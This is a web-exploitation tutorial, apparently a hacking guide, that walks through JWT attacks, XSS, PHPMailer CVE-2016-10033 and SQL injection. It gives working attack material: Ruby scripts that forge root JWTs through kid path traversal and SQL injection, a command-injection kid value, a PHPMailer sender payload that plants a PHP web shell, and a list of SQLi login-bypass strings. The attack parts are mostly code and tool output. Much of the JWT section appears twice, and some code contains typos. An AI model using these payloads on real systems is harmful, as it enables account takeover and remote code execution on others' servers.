# Learning from the Field: Web Exploitation

## JWT

JSON Web Token (JWT) is an Internet standard for creating data with optional signature and optional encryption. JWTs can be signed using a secret (with the HMAC algorithm) or a **public/private** key pair using **RSA** or **ECDSA**.

### Usage of JWTs

A very common use of a JWT token is as an API **authentication mechanism** as well as **Information Exchange**.

#### Authentication Mechanism

Once the user is logged in, the user can access everything allowed with that token.

#### Information Exchange

JWTs are useful in sharing information because they are signed by public/private keys as well as we can verify the token if it's tampered or not.

### JSON Web Token structure

JWTs cosists of 3 parts seperated by dots.

`header.payload.signature`

#### Header

Header consist of two things: first one is **type of token** and another thing is **signing algorithm** like HMAC SHA256 or RSA.

For Example:

`Base64:    eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0=`

After Decoding:

``` json
{
  "alg": "SH256",
  "typ": "JWT"
} 
```

#### Payload

Payload contains the claims. Claims are statements about the user and additional data about the user.

For Example:

`Base64: eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ==`

After Decoding:

```json
{
    "id": "1",
  "name": "Anas Jamal",
  "admin": true
} 
```

#### Signature

For creating the signature part you have to take the base64 encoded header and payload, a secret, the algorithm specified in the header, and sign that.

For Example:

```js
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
  )
```

#### All 3 Combined

`Header + Payload + Secret`

```js
eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0.eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ.6pqwrq5XQFq3453rtw234fuZ4
```

### Implmenting

Whenever you will recieve a jwt token first decode it and break it into parts like we have learnt in the above section.

`Header + Payload + Secret`

#### Decoding

For decoding you can use:

1. Terminal  
2. [jwt.io](https://jwt.io/)
3. Decoder tab in burp Suite

There are other ways for decoding the token too.

##### Terminal

Linux:

```bash
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -d 
```

Mac OS:

```bash
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -D 
```

Note: Keep in mind in mac os we use "D" instead of  "d".

##### jwt.io

just copy the whole token and paste it into `Encoded` Section and you will get decoded token in `Decoded` Section.

##### Burp Suite Decoder

Copy the whole token and go to burp suite `Decoder` tab and paste it there and select first part and click on `decode` as `base64` and do the same thing with other parts of the token.

**Note** : Don't include dot(`.`) while decoding the token.

#### None Algorithm

`None` Algorithm is used when the integrity of the token has been already verified but hackers can use this algorithm and can tamper the token and can gain unauthorized access.
Let's See How

```js
Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.6pqwrq5XQFq3453rtw234fuZ4
```

#### JWT Token Break Down

1. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (Header)
2. eyJ1c2VyIjoidGVzdCJ9 (Payload)
3. 6pqwrq5XQFq3453rtw234fuZ4 (Secret)

After Decoding:

Header:

```js
{
    "alg":"HS256",
    "typ":"JWT"
}
```

Payload:

```js
{
    "user":"test"
}
```

Now let's change "alg" from `HS256` to `None` and "user" from `test` to `admin`

Header After Changes:

```js
{
    "alg":"None",
    "typ":"JWT"
}
```

Payload After Changes:

```js
{
    "user":"admin"
}
```

Now base64 encode `Header` and `Payload` and send the new token to the web application with empty `secret`.

New Token:

```js
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

For encoding we can use :

1. CyberChef
2. Burp Suite Decoder
3. Your Terminal

For encoding on Terminal just remove `-d` / `-D` let's see an example

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64
```

For sending Requests we can use:

1. Inspect Element > Go to cookies > replace the token with your new token.
2. Burp Suite Intercept or send the requests to repeater and play with the request.

So this is one simple way of hacking JWTs.

### Exploiting JWT

#### CVE-2016-5431 Key Confusion Vulnerability

##### RSA

The `RSA` is asymmetric and in assymetric we have 2 keys

```md
1. Public Keys (for verifying you need a public key coresponding to the private key used for the signature.)

2. Private Keys. (For signing the token you need a private key)
```

Library Function: `verify(clientToken, serverRSAPublicKey)`

##### HMAC

The `HMAC` uses the same secret for signing as well as verifying the token.

Library Function: `verify(clientToken, serverHMACSecretKey)`

##### The Vulnerability

The vulnerability is straight forward, The attacker can change the algorithm from `RS256` to `HS256` that means from RSA to HMAC .

So when you send the tampered cookie the code will call `verify(clientToken, serverHMACSecretKey)` instead of `verify(clientToken, serverRSAPublicKey)` because our token algorithm is `HS256`.

Now Public keys are available publicly and we can forge our new token by changing the algorithm from `RS256` to `HS256` and signing our token with the publicly available key.

##### The Exploitation

We can exploit it in several ways we will mention 3 methods:

1. Manually decoding / encoding and signing.
2. Writing your own script using any scripting language (ruby/python).
3. using [jwt_tool](https://github.com/ticarpi/jwt_tool).

The easiest way is using [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

1. clone the tool and install all dependencies.
2. Download the public key in the same directory.
3. Run the tool

Syntax : `./jwt_tool.py <paste your token>`

```py
./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImFuYXMifQ.abcWIUU4HvocTw1aiP44hjawkr5CUTTjRAb0QCb00l82vJjjs5Nuilm10eQMkGGlleH_99MSMgZZ8xlZksOtVWmcXXflAOm0pLiDhol_Fpnak-BMSUmc9CjtJvFy_0qkmKz8T4QWZ7gG2XjRGcsueNKS-Hx9ExGDlLAGsdmiwMiLzuNeO7iW7ECG9nUrNMpArL3s9cMi-NBiSQQd3DkJLNPZzk2J0Ew-aM3Z744uBH38oNKl4n2ktr4baQMxMIe7pecNLzGgQnZ9UPt-kgzqzPActSK0H4CLhJAekNv3QgOhtJxfeF3e9bMkVx8E4rhTnX4gTqfeu1CX-r1VCtaLdQ

```

##### OUTPUT

after running choose option 1 for tampering with the token.

```md
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = RS256

Token payload values:
[+] login = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

```

After choosing `1` choose `0` and press `1` and change `<your username>` to `admin` in this case from `anas` to `admin`.

```md
====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = RS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] login = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of login is: demo
Please enter new value and hit ENTER
> admin
[1] login = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step
```

press `0`

Now the last Step:
The vulnerability here is `Sign with HS/RSA key confusion vulnerability` choose `4` and type the name of public key file name in this case our public key file name is `public.key` and hit `Enter` and if everything goes well we will get our new forged token.

```md
Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 4

Please enter the Public Key filename:
> public.key

====================================================================
This option takes an available Public Key (the SSL certificate from 
a webserver, for example?) and switches the RSA-signed 
(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.
====================================================================
File loaded: public.key

Set this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).
(This will only be valid on unpatched implementations of JWT.)

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.CN6XRx3X4MavzJW0pYNJWJzt0xdSLwnGRX6uHr35qGA

```

Now just send the forged cookie to the site using curl, burp suite, or simply using inspect element.
Finally we will get admin access :)

#### Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature.
You can try exploit them if they are not properly sanitized.

### Multiple types of vulnerabilities in kid

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

### Local File Inclusion

Let's Take an Example :

#### Token

```js
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:

```js
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```

Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```js
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```

After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby.

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple.

`OpenSSL::HMAC.hexdigest("SHA256", key, data)`

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```js
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`.

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`.

#### Command Injection

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```js
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token

`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```js
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

### Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature.
You can try exploit them if they are not properly sanitized.

#### Multiple types of vulnerabilities in kid

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

#### Local File Inclusion

Let's Take an Example :

#### Token

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:

```json
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```

Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```json
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```

After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby.

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple.

`OpenSSL::HMAC.hexdigest("SHA256", key, data)`

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```ruby
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`.

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`.

### Command Injection in KID

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```bash
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token

`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```bash
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

### SQLi in KID

SQLi in KID is very similar to `Command Injection` and `Local File Inclusion` because `KID` can also retrieve key from the databse.

let's see an example :

```json
{
"alg" : "HS256",
"typ" : "JWT",
"kid" : "1"
}
```

If SQLi is possible in KID we can forge our own `root` account token using a simple ruby / python script or manually.

#### Ruby Script

```ruby

require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "keynotpresent\' UNION SELECT \'newkey"}'
payload = '{"user": "root"}'

header_payload = Base64.strict_encode64(header)+"."+ Base64.strict_encode64(payload)
header_payload.gsub!("=","")

secret = "newkey"

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, header_payload))

token = header_payload+"."+signature
puts token
```

#### Explaination

The script imports `base64` and `openssl` modules and the real trick is in `header` the payload forces application to sign the token with key value `newkey` because `keynotpresent` does not exist in the database so it will use `newkey` as it's secret and sign it and we know that secret so we can forge our token easily and sign them.

#### Token After Running the Script

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogImtleW5vdHByZXNlbnQnIFVOSU9OIFNFTEVDVCAnbmV3a2V5In0.eyJ1c2VyIjogInJvb3QifQ.zRLDqEZ1tQC8atcO7bjvHaSTTpEefORDyqgFUnZH4Ok`

### Cracking JWTs Secret

Sometimes developers use common terms as a token secret.
If that's the case we can crack them easily. We can use [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

First let's Prepare a wordlist:

```bash
password
Password123
admin
root
hackingbible
```

you can also use `rockyou.txt` or there are lots of wordlists present on the internet.

```bash
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjphbmFzfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 7
Please provide filename for dictionary file.

> wordlist.txt

Loading key dictionary...
File loaded: wordlist.txt
Testing passwords in dictionary...

[+] hackingbible is the CORRECT key!
```

If we got lucky we can get the Correct key. Now after cracking the secret we can just forge the token.

```bash
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjphbmFzfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = HS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] user = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of user is: None
Please enter new value and hit ENTER
> admin
[1] user = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 1

Please enter the known key:
> hackingbible

Please enter the keylength:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc
[+] Standard: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc+N077EOEhFVJdvA7ufgp8qb+fLLUkIyqZc

```

Voila!! we got our admin token, now just use inspect element or burp suite repeater and refresh you will get admin session.

## XSS

Cross-Site Scripting (XSS) attacks are a type of injection.Using This You can inject malicious payload in to the website.

### Type Of XSS

#### Reflected XSS

It occurs when an application receives data in an HTTP request and includes that data within the response

```html
   http://example.com/data?username=Data+Example

   <h2> Username : Data Example </h2>
````

It can not perform any other processing in data so that we can inject our payload easyly.

```html
   http://example.com/data?username=<script>/* Your Payload */ </script>

   <h2> Username : <script>  /* Your Payload */ </script>
```

##### Impact of Reflected XSS

* It Perform any action that user can perform in website.
* View and modify any information that user can do

#### Stored XSS

Its occurs when an application receives data from an untrusted source and includes that data within its later HTTP responses

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=temp+feedback

  <p>temp feedback </p>
```

It can not perform any other processing in data so that we can inject our payload easyly.
here we use encoded url.

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=%3Cscript%3E%20%20%2F*%20Your%20Payload%20*%2F%20%3C%2Fscript%3E

  <p><script>  /* Your Payload */ </script></p>
```

When its execute in website now it is permanently added in that website and any user can view that

##### Impact of Stored XSS

* Attackers can change any parameters and write anything in the website source code
* Attackers can easyly execute that malicious code in website
* The key difference between reflected and stored XSS is that stored XSS vulnerabilities are contained within the application and the attacker does not need to induce the target to click on a specific link with their exploit.

#### DOM (Document Object Model) XSS

Its occurs when an application contains some client-side JavaScript that processes data from an untrusted source, usually by writing the data back to the DOM.

```html
var search = document.getElementById('username').value;
var results = document.getElementById('results');
results.innerHTML = 'Your username is : ' + username;

```

Hear attacker can control the value of input field so that they can create their own malicious payload and execute it

```html
 Your username is : <img src=1 onerror='/* Your Payload */'>
```

##### Impact of DOM XSS

* Account Hijacking : Attackers often steal session cookies in the browser to hijack user accounts.
* Credential Theft  : Attackers can clone the page and sent that page to victim and victim use credentials and its forward to attacker.
* Data Leakage : attacker has access to the personal or sensitive information of users

## PHPMailer CVE-2016-10033

This bug is very interesting and very easy to exploit. Let's breakdown the basic Functionality of PHPMailer.

```steps
 1) PHPMailer gets user requests
 
 2) PHPMailer validates the user supplied information
 
 3) PHPMailer sends the information to the PHP mail() function to send the email.
```

### Bug

The problem here is PHPMailer does not clean the user supplied email values before sending it to the PHP mail() function. it basically returns `$result` and pass it to mail() function.

### Exploitation

The exploitation is simple

`"malicious@127.0.0.1\" -oQ/tmp/ -X/var/www/malicious.php  root"@127.0.0.1`

Pass this into `FROM` field and your PHP code into mail body.

```malicious
<?php system$(_GET["command"]); ?>
```

intercept the request and edit the request in it and forward it or you can just simply change type from `mail` to `text` and send.

So in the above code we are basically creating a file `malicious.php` and the code of that file is in `body` of the mail.

now just visit :
`https://vulnerablesite.com/malicious.php?command=whaomi`

and we got rce easily through this vulnerability in PHPMailer also you can get reverse shell using this method.

## SQL Injection

In this we will discuss about SQL Injections let's first see a simple definition of SQL.
SQL is `Structured Query Language`, which is a computer language for storing, manipulating and retrieving data stored in a database.

Now let's understand SQL Injection. Basically SQL injections are web security vulnerabilities that are very dangerous and allows an attacker to alter the logic of the query and the attack can lead to data theft, website defacement (changing the content of website), sometimes it can allow an attacker to delete or modify the data inside the data. So from this you can now imagine how dangerous SQL injection is.

### Let's Clear Some Basics First

First we have to know types of queries in SQL:

1. SELECT : It is used to select data from the database.

  Syntax:

  ```syntax
   SELECT column1, column2, ...
   FROM table_name; 
```
  
2. INSERT : adding new rows to a table.

  Syntax:

  ```syntax
   INSERT INTO table_name (column1, column2, column3, ...)
   VALUES (value1, value2, value3, ...);  
```

3. UPDATE: It is used to update any record of data in a table.

Syntax:

  ```syntax
   UPDATE table_name
   SET column1 = value1, column2 = value2, ...
   WHERE condition;  
```

4. DELETE: Removing rows from a table

```syntax
   DELETE FROM table_name WHERE condition;
```

5. Stored Procedures : MSSQL procedures xp_cmdshell which can be used for executing commands on the remote database host.

Now let's see how to make comments in SQL.
we can make comments using two hyphens. 

`--`

the query after `--` will be ignored and that's very useful in sql injection.

Let's take an example :

`SELECT username,password FROM users WHERE username='$INPUT1$' AND password='$INPUT2$';`

Where $INPUT1$ and $INPUT2$ are taken from the user of the application.

Basically our above query is checking if the user input values are present inside the database or not.

let's assume `$INPUT$` = `test` and `$INPUT2` = `testpass`

our payload: `test' OR 1=1 --`

For better understanding let's break down the payload and insert it into the query.

```query
SELECT username,password FROM users WHERE username='test' OR 1=1 --' AND password='testpass';
```

Payload Breakdown:

`test'` : it is breaking out the `''` in the query.

`OR` : OR becomes true whenever we have atleast one condition true.

`1=1` : for making our whole query always true we are using `1=1` that is always true.

`--` : As we have saw earlier `--` comments out the rest of the query that means password check is "commented out" so that it has no effect.

So ultimately the attacker has altered the logic of the statement and that could bypass authentication cause the database to leak confidential information or even execute functions such as executing operating system commands.

### Detecting Vulnerable Functions

Consider the following query which loads a news article from the database to display on an fictitious web application:

`SELECT id,title,content FROM tblArticles WHERE id=$input`

A effective way to do detect vulnerable functions is to generate an error or to alter the query in such a way that we have successfully injected into SQL and possibly see a visible result. e.g. SQL-like syntax being parsed in the expected way.
when we pass `'` as an input the website will return an error. if we got an error we have to confirm it that it is due to `'` and we can confirm it by few ways.

1. `--'` : this will tell the database ignore everything after the `--` .

2. If the user input is integer we can try to subtract it with some number and if that works that means we have an sqli.

For example:

`http://sql.example.org/news?id=100`

  Now let's subtract 1 from 100.

`http://sql.example.org/news?id=100-1`

and if we got `id=99` that means we have an sqli.

3. What if we have a string instead of a integer?

For Example:

`http://sql.example.org/news?page=example`

With the above case it’s possible to utilize string concatenation in a similar way, where if the string is evaluated and concatenated then the output should not change whereas if it is no evaluated then a noticeable change in output will occur. The method of concatenation differs between back-end database types however if one works you have the added benefit of fingerprinting the database type!.

#### MSSQL

```mssql
exa'+'mple
With URLs a + is space, use %2b instead (URI encoded plus sign)!
```

#### MySQL

```mysql
exa' 'mple (that's a space between two apostrophes)
```

#### Oracle

```oracle
exa'||'mple
```

Another way of detecting the vulnerability is to concatenate a simple conditional at the end of the input, such as:

```ex
AND 1=1 -- (This will get evaluated as True as 1=1)
AND 1=2 -- (This will get evaluated as False as 1 is not equal to 2)
```

Awesome now we have learned lots of tricks but what if `'` is not allowed ? In that case we can use comparisons between valid and invalid system variables. Let's see the example:

```ex
AND (SELECT @@version)=(SELECT @@version) -- 

AND SLEEEP(5)=SLEEP(5) --
```

First one is valid but is invalid because `SLEEEP` is not equal to `SLEEP` .

### Bypassing Login Screens (SMO+)

#### SQL Injection 101, Login tricks

```tricks
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
' or 1=1 limit 1 -- -+
'="or'
admin' or 2 LIKE 2--
```

#### Login as different user (SM)

```tricks
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--

Note: *Old versions of MySQL doesn't support union queries
```

#### Bypassing second MD5 hash check login screens

If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.

#### Example

```trick
Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password : 1234
81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
```

### Types Of Injections

SQL Injection can be classified into 3 main categories :

1. In band SQLi

2. Inferential SQLi

3. Out of band SQLi

#### In Band SQLi

In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results also this is easy to exploit and very common attack.
In Band SQLi is sub divided into 2 parts :

1. Error based SQLi
2. Union based SQLi

#### Error Based

